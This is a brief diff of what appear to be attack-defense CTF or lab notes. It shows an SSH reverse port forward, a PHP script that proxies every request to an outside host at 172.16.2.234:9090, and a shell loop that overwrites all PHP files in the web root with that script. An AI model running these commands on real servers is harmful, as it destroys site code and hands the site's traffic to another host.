@@ -22,8 +22,8 @@ ssh -g -R 8080:127.0.0.1:80 123@192.168.80.196
 ```
 hack@36800769995c:/var/www/html$ cat /tmp/1.php
 <?php
-$me=str_replace('/var/www/html','',__FILE__);
-echo file_get_contents("http://172.16.2.234:9090".$me);
+echo file_get_contents("http://172.16.2.234:9090".$_SERVER["REQUEST_URI"]);
+
 
 for i in `grep p -lr|grep ".php"`;do echo $i;cat /tmp/1.php > $i;done
 ```
